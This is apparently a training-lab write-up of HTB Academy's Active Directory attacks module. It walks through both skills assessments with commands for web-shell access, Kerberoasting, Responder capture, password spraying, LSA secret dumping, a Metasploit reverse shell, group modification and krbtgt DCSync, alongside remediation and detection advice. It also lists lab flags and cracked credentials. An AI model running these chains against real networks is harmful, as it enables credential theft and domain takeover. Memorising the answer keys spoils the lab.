![Captured evidence 035: Impacket/secretsdump example from an earlier module exercise](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_035.jpg "CAPTURED - E035 Impacket/secretsdump example from an earlier module exercise. Original image from user archive.")



## 30. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

Cross-forest trust assessment considers forest-wide identity boundaries and controls such as selective authentication, allowed-to-authenticate ACEs, SID filtering and credential delegation. Windows tools can enumerate trust properties and domain-local groups containing foreign principals. A foreign user may authenticate to a resource without being able to administer it.

```powershell
Get-ADTrust -Filter * |
  Format-Table Name,Direction,ForestTransitive,SelectiveAuthentication
```

The assessment should identify a concrete, authorized cross-forest privilege edge rather than assume a trust equals compromise. Recommended defenses include selective authentication where appropriate, administrative tier separation, robust SID filtering, trust-account monitoring and limiting persistent sessions across trust boundaries.




![Captured evidence 010: Windows/Kerberos trust exploration example](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_010.jpg "CAPTURED - E010 Windows/Kerberos trust exploration example. Original image from user archive.")



## 31. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

From Linux, combine forest/domain enumeration, name-service resolution, Kerberos ticket inspection, `rpcclient`/SMB and LDAP queries to discover the accessible forest. Pay special attention to which side owns the resource, because authorization is decided in that security boundary. A successful DNS query or TCP connection is only a network observation, not evidence of authenticated cross-forest access.

Document each ticket's realm, service SPN and trust path; avoid broad enumeration beyond the permitted forest. If no exploitable trust boundary is verified, the correct result is **no demonstrated cross-forest escalation**. In the provided assessment chains, the decisive impact was local and single-domain ACL abuse rather than a cross-forest exploit.




![Captured evidence 011: Linux ticket retrieval example](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_011_sec31.jpg "CAPTURED - E011 Linux ticket retrieval example. Original image from user archive.")



## 32. Hardening Active Directory

AD hardening must break the attack chain at multiple points rather than assume a single control is sufficient. The Part II attack path shows where layers failed: LLMNR/NBT-NS allowed NetNTLMv2 capture; weak passwords supported offline cracking and spraying; SMB exposed a connection string; SQL privileged execution allowed service-token use; local privilege escalation and credential exposure expanded reach; an excessive ACL allowed a low-level account to control Domain Admins; replication then yielded sensitive password material.

**Recommended controls:** disable unused LLMNR/NBT-NS; restrict NTLM and require SMB signing where applicable; enforce MFA and weak-password rejection; implement sensible fine-grained lockout policies; use gMSAs/managed secrets for services; remove plaintext credentials from `web.config`; enforce local-admin separation, Credential Guard/LSA protection and EDR where supported; reduce unnecessary WinRM, SMB and MSSQL reachability; audit `GenericAll`, `WriteDacl`, `WriteOwner` and replication extended rights; secure privileged groups with tiered administration; alert on group membership changes and anomalous DCSync traffic.

## 33. Additional AD Auditing Techniques

A mature AD assessment should leave defenders actionable validation points. Capture LDAP and Kerberos changes, privileged-group modifications, service creation, remote management, logon types, script execution and replication requests. Windows events often relevant to review include 4624/4625 (logons), 4768/4769 (Kerberos), 4728/4729 (group membership), 4732/4733 (local group changes), 4662 (audited directory access), 4688 (process creation), 7045 (service installation), and PowerShell 4104 where enabled. Event availability depends on policy and channel.

Build detection queries around a sequence rather than a string: many denied Kerberos attempts across users; an unexpected SMB share read of configuration files; `xp_cmdshell` being enabled; a server process launching Windows command interpreters; newly delegated privileged-group rights; and an endpoint not designated as a DC issuing directory replication requests. Triage should combine host role, user identity, timestamp, network flow and explicit business authorization.

---



![Captured evidence 021: Security-control telemetry from a guided Windows lab](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_021.jpg "CAPTURED - E021 Security-control telemetry from a guided Windows lab. Original image from user archive.")



## 34. AD Enumeration & Attacks - Skills Assessment Part I

### 34.1 Objective and methodology

The first assessment starts from an exposed IIS/ASP.NET web application, pivots through WEB01, uses an SPN-bearing service account for lateral movement, discovers a second domain account and validates DCSync rights. The flow differs substantially from Part II; do not mix hostnames, addresses, hashes or flags across the two labs.

**Observed chain:** IIS reconnaissance → `/uploads/antak.aspx` → WEB01 SYSTEM → SPN query → Rubeus Kerberoast → John (`svc_sql:lucky7`) → WinRM MS01 → Administrator Desktop flag → NetExec LSA secrets (`tpetty`) → domain-root ACL inspection → DRSUAPI DCSync → pass-the-hash WinRM DC01 → Administrator Desktop flag.

### 34.2 Initial access — WEB01 and Q1

The lab briefing supplied an Antak web-shell login for an application previously determined to expose uploaded server-side code. Authorized enumeration showed IIS on the target and found an `/uploads/` path. The subsequent Antak shell returned `nt authority\system`, host `WEB-WIN01` and the Administrator Desktop flag.

```bash
nmap -sV -p 80,135,139,445,5985 TARGET_IP
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,txt
```

```powershell
whoami
hostname
Get-Content C:\Users\Administrator\Desktop\flag.txt
```

**Q1 result (captured):** `JusT_g3tt1ng_st@rt3d!`. The initial shell context is a Windows service/web execution context; it does not imply blanket domain rights. Note that probing web upload vulnerabilities on public systems without authorization would be outside the lab scope.




![Captured evidence 052: Gobuster identifies the web upload path](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_052.jpg "CAPTURED - E052 Gobuster identifies the web upload path. Original image from user archive.")

![Captured evidence 028: Antak executes as SYSTEM and reads WEB01 flag](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_028.jpg "CAPTURED - E028 Antak executes as SYSTEM and reads WEB01 flag. Original image from user archive.")



### 34.3 SPN discovery, TGS extraction and cracking — Q2/Q3

`setspn` identified the SPN `MSSQLSvc/SQL01.inlanefreight.local:1433` attached to `CN=svc_sql`. Rubeus was transferred from the attack box and used to produce a Kerberos TGS cipher for offline testing. The unmodified ticket was preserved; a duplicate was normalized into John's accepted label format after an initial parse failure.

```powershell
setspn -Q MSSQLSvc/SQL01.inlanefreight.local:1433
C:\Windows\Temp\Rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.inlanefreight.local:1433 /nowrap /outfile:C:\Windows\Temp\sql.hash
```

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt sql-john.hash
john --format=krb5tgs --show sql-john.hash
```

**Q2 result (captured):** `svc_sql`. **Q3 result (captured):** `lucky7`. The key vulnerability is a crackable service-account password, not the mere existence of an SPN.




![Captured evidence 019: Windows SPN query](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_019_sec34.jpg "CAPTURED - E019 Windows SPN query. Original image from user archive.")

![Captured evidence 015: Kerberos ticket normalized and cracked with John](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_015.jpg "CAPTURED - E015 Kerberos ticket normalized and cracked with John. Original image from user archive.")

![Captured evidence 066: John displays the cracked service credential](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_066.jpg "CAPTURED - E066 John displays the cracked service credential. Original image from user archive.")



### 34.4 Correctly identifying MS01 and retrieving Q4

Guessing `ACADEMY-EA-MS01` led to a misleading DNS timeout. The actual LDAP computer list contained `MS01`, and the DNS A record resolved `MS01.INLANEFREIGHT.LOCAL` to `172.16.6.50`. From dual-homed WEB01, `Test-NetConnection` showed WinRM TCP 5985 reachable. `svc_sql` could successfully authenticate to MS01 through PowerShell remoting.

```powershell
$s=New-Object System.DirectoryServices.DirectorySearcher; $s.Filter='(objectCategory=computer)'; $s.FindAll() | ForEach-Object { $_.Properties['name'][0] }
Resolve-DnsName MS01.INLANEFREIGHT.LOCAL -Server 172.16.6.3 -Type A
Test-NetConnection MS01.INLANEFREIGHT.LOCAL -Port 5985
```

```powershell
$p=ConvertTo-SecureString 'lucky7' -AsPlainText -Force
$c=New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\svc_sql',$p)
Invoke-Command -ComputerName MS01 -Credential $c -ScriptBlock {whoami; hostname; Get-Content 'C:\Users\Administrator\Desktop\flag.txt'}
```

**Q4 result (captured):** `spn$_r0ast1ng_on_@n_0p3n_f1re`. In Antak, the one-line form of the `PSCredential` / `Invoke-Command` expression was needed when request-local variables were not retained across submissions.




![Captured evidence 055: LDAP computer records including MS01](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_055_sec34.jpg "CAPTURED - E055 LDAP computer records including MS01. Original image from user archive.")

![Captured evidence 045: Domain Controller discovery and network checks](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_045.jpg "CAPTURED - E045 Domain Controller discovery and network checks. Original image from user archive.")

![Captured evidence 059: WinRM on MS01 and Administrator flag](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_059.jpg "CAPTURED - E059 WinRM on MS01 and Administrator flag. Original image from user archive.")



### 34.5 Privilege triage and credential recovery — Q5/Q6

On MS01, `svc_sql` appeared in `BUILTIN\Administrators`, its token was High integrity and it had enabled `SeDebugPrivilege`, `SeBackupPrivilege` and `SeImpersonatePrivilege`. `quser` reported an active console session for `tpetty`. Searching PowerShell history, profile Documents/Desktop and non-Microsoft Scheduled Tasks produced no useful secret. An LSASS dump was created and hashed, but the effective discovery path eventually came from **LSA secrets** collected through NetExec, which are conceptually distinct from a process memory dump.

A route from Kali to the internal `172.16.6.0/16` was needed. Reverse Chisel SOCKS gave TCP connectivity, but NetExec SMB negotiation repeatedly timed out through ProxyChains even while `nc` succeeded. The operator used a Chisel reverse TCP forward from `127.0.0.1:1445` to MS01 SMB `172.16.6.50:445`, then authenticated with the correct SMB dialect and timeout.

```bash
# Chisel server on the attack host:
chisel server -p 8001 --reverse
# The WEB01 client was configured with a reverse 1445 -> MS01:445 tunnel.
# Local NetExec subsequently succeeded without ProxyChains:
nxc smb 127.0.0.1 --port 1445 -d INLANEFREIGHT -u svc_sql -p 'lucky7' --no-smbv1 --smb-timeout 15 --lsa
```

The real tool output included `INLANEFREIGHT\svc_sql:lucky7 (Pwn3d!)`, `Dumping LSA secrets` and `INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR`. **Q5 result:** `tpetty`. **Q6 result:** `Sup3rS3cur3D0m@inU2eR`. LSA/DPAPI extracts are sensitive evidence; the report does not need to publish unrelated machine secrets from the dump.




![Captured evidence 034: MS01 profile inspection](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_034.jpg "CAPTURED - E034 MS01 profile inspection. Original image from user archive.")

![Captured evidence 061: svc_sql local administrator token / tpetty console session](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_061_sec34.jpg "CAPTURED - E061 svc_sql local administrator token / tpetty console session. Original image from user archive.")

![Captured evidence 013: LSASS dump and SHA-256 evidence](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_013.jpg "CAPTURED - E013 LSASS dump and SHA-256 evidence. Original image from user archive.")

![Captured evidence 062: NetExec LSA secret extraction](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_062.jpg "CAPTURED - E062 NetExec LSA secret extraction. Original image from user archive.")



### 34.6 Replication rights, DCSync and final DC flag — Q7/Q8

An ADSI domain-root ACL query directly showed `INLANEFREIGHT\tpetty` Allow ACEs for both replication extended-right GUIDs. This independently established the significance of the recovered credentials before executing replication. The first Impacket attempt via ProxyChains timed out despite TCP 445 and 135 being reachable. The actual fix was to call a real Python `secretsdump.py` using a PySocks socket patch, not pass the `/usr/bin/impacket-secretsdump` shell wrapper into Python's `runpy`.

```powershell
$d=[ADSI]'LDAP://DC=INLANEFREIGHT,DC=LOCAL'
$d.ObjectSecurity.Access | Where-Object {$_.ObjectType -in @([guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',[guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,AccessControlType
```

```bash
# Scoped illustration of the successful DRSUAPI request (run via the established lab route):
impacket-secretsdump -just-dc-user Administrator -dc-ip 172.16.6.3 'INLANEFREIGHT.LOCAL/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3'
```

The resulting capture contained `Using the DRSUAPI method to get NTDS.DIT secrets` and an Administrator NTLM hash. The operator then used Pass-the-Hash and forwarded WinRM to DC01 to read the flag. **Q7 result:** `DCSync`. **Q8 result (captured in the archive):** `r3plication_m@st3r!`.




![Captured evidence 069: tpetty replication rights on the domain object](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_069_sec34.jpg "CAPTURED - E069 tpetty replication rights on the domain object. Original image from user archive.")

![Captured evidence 039: Successful DRSUAPI extraction of Administrator secret](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_039_sec34.jpg "CAPTURED - E039 Successful DRSUAPI extraction of Administrator secret. Original image from user archive.")

![Captured evidence 065: DC01 Administrator identity and final flag](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_065.jpg "CAPTURED - E065 DC01 Administrator identity and final flag. Original image from user archive.")



### 34.7 Part I answer ledger

| Q | Required evidence | Verified answer | Basis |
|---|---|---|---|
| 1 | WEB01 Administrator flag | `JusT_g3tt1ng_st@rt3d!` | Captured shell screenshot |
| 2 | MSSQL SPN account | `svc_sql` | `setspn` output |
| 3 | Cracked TGS password | `lucky7` | John output |
| 4 | MS01 Administrator flag | `spn$_r0ast1ng_on_@n_0p3n_f1re` | Remote PowerShell output |
| 5 | Second domain account | `tpetty` | NetExec LSA secrets |
| 6 | Second account password | `Sup3rS3cur3D0m@inU2eR` | NetExec LSA secrets |
| 7 | Authorized directory attack | `DCSync` | Replication ACEs and DRSUAPI |
| 8 | DC01 Administrator flag | `r3plication_m@st3r!` | Evil-WinRM screenshot |

**Assessment lesson:** A web shell should not have domain-level impact on its own. The effective chain was created by an SPN account with a weak password, privileged local placement, recoverable secondary credentials, over-broad replication rights and reachable management services.

---

## 35. AD Enumeration & Attacks - Skills Assessment Part II

### 35.1 Scope, attack path and evidence confidence

The second assessment begins on an authorized Parrot Linux machine (`ACADEMY-EA-PAR01-SA2`) at `10.129.14.35`, using the supplied SSH account `htb-student`. Its second interface `ens224` lies in the AD lab subnet `172.16.7.240/23`. The objective is to compromise the domain through successive credential and authorization weaknesses and provide 12 requested answers.

**Observed in the user's session or uploaded evidence:** PAR01 interface selection, Responder execution, NetNTLMv2 capture, offline cracking, WinRM to MS01, initial MS01 flag, LDAP user enumeration (2,901 users), lockout policy `0`, Kerbrute valid login, SMB share and connection string, MSSQL `netdb` authentication and `sysadmin`, enabled `xp_cmdshell`, Windows service identity and `SeImpersonatePrivilege`, and a Meterpreter session as `NT SERVICE\MSSQL$SQLEXPRESS`.

**Reconstructed from user-provided answers and public references:** completion of SQL01 SYSTEM/Administrator flag, reuse of an Administrator hash on MS01, the BloodHound `CT059 → GenericAll → Domain Admins` edge, recovery of `CT059`'s password through Inveigh/offline cracking, privileged group membership change, DC01 Administrator flag and KRBTGT DCSync. These steps are useful as a full lab walkthrough, but the archive does not establish them as first-person executed evidence.

### 35.2 Q1–Q2 — Capture and crack a NetNTLMv2 credential

SSH was established to PAR01. Interface enumeration showed `ens192` at `10.129.14.35/16`, `ens224` at `172.16.7.240/23` and a down `docker0`. Responder was bound to `ens224` and captured an SMB NetNTLMv2 challenge-response saved in `/usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt`. The capture is a challenge/response, not a raw NT hash or plaintext password.

```bash
ssh htb-student@10.129.14.35
ip -br a
sudo responder -I ens224
sudo ls -lt /usr/share/responder/logs/
sudo awk -F'::' '{print $1}' /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt | sort -u
sudo head -n 1 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt > ~/q1.hash
hashcat -m 5600 ~/q1.hash /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ~/q1.hash --show
```

The captured Hashcat output ended with `:weasal`, and the captured principal was `AB920::INLANEFREIGHT`. **Q1:** `AB920`. **Q2:** `weasal` (spelling matters; it is not `weasel`). This step demonstrates that the exposure from name-resolution poisoning becomes harmful when the challenge-response can be cracked offline.




![Captured evidence 060: Hashcat --show displays the captured AB920 NetNTLMv2 and recovered password](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_060.jpg "CAPTURED - E060 Hashcat --show displays the captured AB920 NetNTLMv2 and recovered password. Original image from user archive.")



### 35.3 Q3 — First Windows foothold and MS01 flag

After credential recovery, the attacker validated connectivity to `172.16.7.50:5985` and authenticated via Evil-WinRM. The shell reported `inlanefreight\ab920` and hostname `MS01`. Reading the designated root file returned the flag requested by Q3.

```bash
nc -zvw3 172.16.7.50 5985
evil-winrm -i 172.16.7.50 -u AB920 -p 'weasal'
```

```powershell
whoami
hostname
Get-Content C:\flag.txt
```

**Q3:** `aud1t_gr0up_m3mbersh1ps!`. This is an initial-user flag, distinct from the later *Administrator Desktop* MS01 flag requested by Q8. Keeping these two milestones separate avoids falsely treating user-level login as host administration.




![Captured evidence 027: Evil-WinRM on MS01 with initial user flag](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_027.jpg "CAPTURED - E027 Evil-WinRM on MS01 with initial user flag. Original image from user archive.")



### 35.4 Q4–Q5 — LDAP enumeration and Kerberos password spraying

The `AB920` WinRM shell could not enumerate domain accounts with `net user /domain` or a default `DirectorySearcher` bind; it returned access/operations errors. A direct LDAP simple bind from PAR01 succeeded. Without paged results, the directory applied a size limit; adding the paged-results control yielded **2,901** `sAMAccountName` entries. The default domain-root policy returned `lockoutThreshold: 0`, but the possibility of fine-grained policies remained.

```bash
ldapsearch -LLL -x -E pr=200/noprompt \
  -H ldap://172.16.7.3 \
  -D 'AB920@INLANEFREIGHT.LOCAL' -w 'weasal' \
  -b 'DC=INLANEFREIGHT,DC=LOCAL' \
  '(&(objectCategory=person)(objectClass=user))' sAMAccountName \
  | awk '/^sAMAccountName: /{print $2}' | sort -u > ~/domain-users.txt
wc -l ~/domain-users.txt
```

```bash
kerbrute passwordspray -d INLANEFREIGHT.LOCAL \
  --dc 172.16.7.3 ~/domain-users.txt 'Welcome1'
```

The user's screenshot shows `VALID LOGIN: BR086@INLANEFREIGHT.LOCAL:Welcome1`. **Q4:** `BR086`. **Q5:** `Welcome1`. The practical failure was a weak, reused or default-style password applied to a readable domain account; the fact the domain default lockout threshold was zero increased the testing latitude in this particular authorized lab.




![Captured evidence 006: Kerbrute VALID LOGIN for BR086:Welcome1](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_006_sec35.jpg "CAPTURED - E006 Kerbrute VALID LOGIN for BR086:Welcome1. Original image from user archive.")



### 35.5 Q6 — Sensitive MSSQL connection string in an SMB share

Using `BR086`, the operator opened the SMB share `Department Shares` on DC01 and navigated through `IT\Private\Development` to `web.config`. The file included a database connection string with SQL user `netdb` and password `D@ta_bAse_adm1n!`. This is an application configuration leak that crosses the user-account-to-database trust boundary.

```bash
smbclient '//172.16.7.3/Department Shares' -U 'INLANEFREIGHT\BR086%Welcome1'
```

```text
smb: \> cd IT
smb: \IT\> cd Private
smb: \IT\Private\> cd Development
smb: \IT\Private\Development\> ls
smb: \IT\Private\Development\> get web.config
```

```bash
grep -iE 'connectionString|User ID|Password' web.config
```

**Q6:** `D@ta_bAse_adm1n!`. In a real report, this finding merits remediation because it exposes a reusable secret through a file share whose readers do not need database administration rights. Use an application secrets service and review share ACLs and legacy deployment artifacts.




![Captured evidence 026: Navigating Department Shares/IT/Private](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_026.jpg "CAPTURED - E026 Navigating Department Shares/IT/Private. Original image from user archive.")

![Captured evidence 070: Finding Development within the SMB share](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_070_sec35.jpg "CAPTURED - E070 Finding Development within the SMB share. Original image from user archive.")

![Captured evidence 071: Inspecting web.config and MSSQL connection string](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_071_sec35.jpg "CAPTURED - E071 Inspecting web.config and MSSQL connection string. Original image from user archive.")

![Captured evidence 074: A second captured view of the configuration](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_074.jpg "CAPTURED - E074 A second captured view of the configuration. Original image from user archive.")



### 35.6 Q7 — SQL01 execution, service token and local privilege escalation

Direct TCP testing showed `172.16.7.60:1433` was open. Impacket's MSSQL client required TLS negotiation, then connected to the SQL01 `SQLEXPRESS` instance. `SYSTEM_USER` returned `netdb` and `IS_SRVROLEMEMBER('sysadmin')` returned `1`. Enabling `xp_cmdshell` succeeded; it reported commands running as `NT SERVICE\MSSQL$SQLEXPRESS`, with `SeImpersonatePrivilege` **Enabled**.

```bash
nc -zvw3 172.16.7.60 1433
impacket-mssqlclient 'netdb:D@ta_bAse_adm1n!@172.16.7.60'
```

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

```text
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell whoami /priv
```

Next, the user configured `exploit/windows/mssql/mssql_payload` in Metasploit with RHOSTS `172.16.7.60`, username `netdb`, its password, `TDSENCRYPTION=true`, and a reverse payload reaching PAR01's internal IP `172.16.7.240`. The screenshot and chat verify a Meterpreter session with `getuid` = `NT Service\MSSQL$SQLEXPRESS` and `getprivs` including `SeImpersonatePrivilege`. The referenced public walkthrough uses Meterpreter `getsystem` to elevate locally, followed by reading the SQL01 Administrator Desktop flag; that successful SYSTEM/flag-reading step is **not pictured** in this ZIP.

```text
# Meterpreter method reported by the public reference:
getsystem
getuid
shell
# Then from a Windows shell:
type C:\Users\Administrator\Desktop\flag.txt
```

**Q7 user-provided answer:** `s3imp3rs0nate_cl@ssic`. **Evidence status:** verified SQL service execution and Meterpreter access; final flag supplied by the user, not independently visible in the screenshot archive.




![Captured evidence 042: SQL01 MSSQL connection and sysadmin validation](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_042.jpg "CAPTURED - E042 SQL01 MSSQL connection and sysadmin validation. Original image from user archive.")

![Captured evidence 005: Metasploit MSSQL payload configuration](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_005.jpg "CAPTURED - E005 Metasploit MSSQL payload configuration. Original image from user archive.")

![Captured evidence 003: Successful Meterpreter staging and session](/writeups/evidence/htb-active-directory-enumeration-attacks/evidence_003.jpg "CAPTURED - E003 Successful Meterpreter staging and session. Original image from user archive.")



### 35.7 Q8 — Reuse of a local administrator hash to access MS01

The public walkthrough describes extracting local credential material on SQL01 after obtaining elevated access, then attempting pass-the-hash access to MS01. The referenced example includes a local Administrator NTLM value; that exact value is source-specific and should not be treated as independently recovered in this user's lab unless shown in their console evidence. The key lesson is the danger of local Administrator password reuse across member servers.

```bash
# Reference method only: use a hash actually obtained from the authorized lab.
evil-winrm -i 172.16.7.50 -u Administrator -H 'NTLM_HASH_FROM_SQL01'
```

```powershell
whoami
hostname
Get-Content 'C:\Users\Administrator\Desktop\flag.txt'
```

**Q8 user-provided answer:** `exc3ss1ve_adm1n_r1ights!`. **Evidence status:** answer supplied, but no directly matching user-shot Administrator flag capture in the Part II evidence segment. **Remediation:** deploy Windows LAPS or equivalent and rotate distinct local administrator credentials, minimizing lateral movement through reused hashes.

### 35.8 Q9 — BloodHound reveals GenericAll on Domain Admins

After administrative access to a member server, a domain collection tool such as SharpHound can build an AD relationship graph. BloodHound is used to ask a precise question: *Which owned or obtainable user has the right to modify a Tier 0 principal or group?* The public Part II walkthrough identifies the user `CT059` with an ACL edge `GenericAll` over the `Domain Admins` group. Unlike a weak password alone, this is an **authorization design failure** that can elevate an ordinary account to privileged-group control.

```powershell
# Typical collection in a permitted lab, parameters vary by SharpHound version:
.\SharpHound.exe -c All --zipfilename domain-collection.zip
```

Investigate the target group and the user principal in BloodHound; verify the `GenericAll` edge on the real AD object's security descriptor before any group membership change. **Q9 user-provided answer:** `CT059`. **Evidence status:** from the user answer and credited public walkthrough; no matching first-person BloodHound graph screenshot in the ZIP.

### 35.9 Q10 — Recover CT059's password

The referenced public method uses Inveigh from a Windows foothold to capture a NetNTLMv2 response belonging to `CT059`, followed by Hashcat `-m 5600` to crack the response offline. This differs from dumping an NT hash from SAM or NTDS: the captured item is a network authentication proof that can be guessed, not the stored password database entry.

```powershell
# Reference method from the public walkthrough, scoped to the lab:
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y -FileOutput Y
```

```bash
hashcat -m 5600 ct059-netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ct059-netntlmv2.txt --show
```

**Q10 user-provided answer:** `charlie1`. **Evidence status:** supplied by the user and public write-up; not directly evidenced by a corresponding Part II capture in the archive. The mitigation is identical in principle to Q1–Q2: remove unsafe name-resolution fallback and require stronger passwords.

### 35.10 Q11 — Abuse group control and read DC01 Administrator flag

With the valid CT059 credential and `GenericAll` on `Domain Admins`, the reported reference chain modifies that privileged group's membership, then authenticates to DC01 with the newly privileged identity. In a live environment, group edits are high-impact operations that may have durable effects; in the authorized Academy lab they are an explicit component of the assessment exercise.

```cmd
:: Reference-only operation shown in the public Part II walkthrough.
net group "Domain Admins" CT059 /add /domain
```

```powershell
$sec=ConvertTo-SecureString 'charlie1' -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059',$sec)
Enter-PSSession -ComputerName DC01 -Credential $cred
Get-Content 'C:\Users\Administrator\Desktop\flag.txt'
```

**Q11 user-provided answer:** `acLs_f0r_th3_w1n!`. **Evidence status:** final answer supplied; underlying group-edit/DC login/flag capture not supplied as direct screenshots for Part II. Security impact is the unauthorized modification of a Tier 0 group, not merely the discovery of the name `CT059`.

### 35.11 Q12 — KRBTGT credential material via DCSync

A principal with sufficient replication rights (including Domain Admin membership in this lab) can request password material through directory replication. The `krbtgt` account is especially important because its keys protect Kerberos ticket-granting tickets. A compromised `krbtgt` secret requires a deliberate domain recovery plan and carefully coordinated rotation.

```text
# Public reference technique in the authorized lab:
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt
```

An equivalent targeted DRSUAPI request can be made with Impacket after authentication as a replication-privileged principal. The objective is to identify the `NTLM` line for `krbtgt`, not confuse it with AES Kerberos key lines or a machine account. **Q12 user-provided NTLM:** `7eba70412d81c1cd030d72a3e8dbe05f`. **Evidence status:** user answer only; the archive does not show a matching Part II DCSync response. This value should not be assumed portable to a fresh lab spawn.

### 35.12 Part II answer ledger — all 12 questions

| Q | Question objective | Answer | Evidence designation |
|---|---|---|---|
| 1 | Domain user whose hash was obtained | `AB920` | Captured Responder/Hashcat |
| 2 | That user's cleartext password | `weasal` | Captured Hashcat `--show` |
| 3 | `C:\flag.txt` on MS01 | `aud1t_gr0up_m3mbersh1ps!` | Captured Evil-WinRM |
| 4 | User found via weak-password test | `BR086` | Captured Kerbrute |
| 5 | Weak password | `Welcome1` | Captured Kerbrute |
| 6 | Password from MSSQL configuration | `D@ta_bAse_adm1n!` | Captured share/config output and user-provided string |
| 7 | SQL01 Administrator Desktop flag | `s3imp3rs0nate_cl@ssic` | User-provided answer; reference path |
| 8 | MS01 Administrator Desktop flag | `exc3ss1ve_adm1n_r1ights!` | User-provided answer; reference path |
| 9 | GenericAll principal over Domain Admins | `CT059` | User-provided answer; reference path |
| 10 | Cracked CT059 password | `charlie1` | User-provided answer; reference path |
| 11 | DC01 Administrator Desktop flag | `acLs_f0r_th3_w1n!` | User-provided answer; reference path |
| 12 | KRBTGT NTLM hash | `7eba70412d81c1cd030d72a3e8dbe05f` | User-provided answer; reference path |

### 35.13 Root-cause analysis and proposed remediation

The chain is not a single catastrophic exploit; it is a sequence of weaknesses that reinforce one another. In order of impact: (1) unauthenticated fallback resolution leaked NetNTLMv2 material; (2) an offline-crackable domain password established access; (3) a common password exposed another domain user; (4) broad SMB share read access revealed a SQL connection password; (5) SQL `sysadmin` and OS command execution opened a powerful server context; (6) local privileged access and credential reuse enabled lateral movement; (7) a dangerous ACE granted control over Domain Admins; and (8) replication privileges exposed Tier 0 account secret material.

Priorities are to disable legacy name resolution, eliminate weak and reused passwords, protect secrets with managed storage, apply least privilege to SMB shares and SQL Server logins, separate local admin credentials, audit and remove improper `GenericAll` on privileged groups, and monitor unauthorized directory replication. Correlate Kerberos authentication events, SMB file access, SQL configuration changes, WinRM/PsExec activity and privileged group modification in a centralized detection workflow.

---

## 36. Beyond this Module

The strongest habit developed in this module is maintaining a **continuously updated graph of privileges and trust paths**. The exercise is not complete merely when a flag is copied. A useful professional report explains what an attacker controlled at each stage, what new data or privilege that control yielded, how the finding was verified, what the security boundary was, what artifacts might reveal the action to defenders, and the smallest remediation that breaks the chain.

Next steps for responsible practice include Windows event-log correlation, Kerberos protocol details, BloodHound custom queries, AD CS abuse modeling, delegation security and privilege-tier design. Use isolated labs for offensive exercises and protect all dumped hashes, tickets, memory captures and directory exports. On an actual engagement, preserve chain of custody, report clearly differentiated observed vs inferred results, and perform cleanup according to the rules of engagement.

## Evidence Coverage Notes

- The user uploaded **74 JPEG screenshots**. All are retained in `evidence/`; the chapter images are a curated selection, not a claim that every screenshot represents a distinct module section.
- **Captured screenshot** captions are used only for files supplied by the user. Some early screenshots are from guided sections, not from Skills Assessment Part II. Their placement reflects the visible technique in the image, not a fabricated chronological capture history.
- Where a module section does not have an appropriate first-person screenshot, this report explains the technique and links public reference material rather than passing another author's screenshot off as the user's evidence. This is intentional evidence integrity.
- The full offline evidence index includes all 74 original files, their sequential archive identifiers and SHA-256 digests so the write-up can be audited and updated later.

## References and Attribution

1. **Hack The Box Academy.** *Active Directory Enumeration & Attacks* — official course description and 36-section table of contents. https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks/introduction-to-active-directory-enumeration--attacks
2. **Mkirahmet (2025).** *AD Enumeration & Attacks — Skills Assessment Part II.* Public procedural cross-check for stages after Q6, including BloodHound, Inveigh and KRBTGT DCSync. https://medium.com/@mkirahmet/ad-enumeration-attacks-skills-assessment-part-ii-e7320fcd58a5
3. **BrunotheCesar.** *Active Directory Enumeration & Attacks.* Public guided-lab notes; concepts independently paraphrased rather than copied. https://github.com/BrunotheCesar/Active-Directory-Enumeration-Attacks
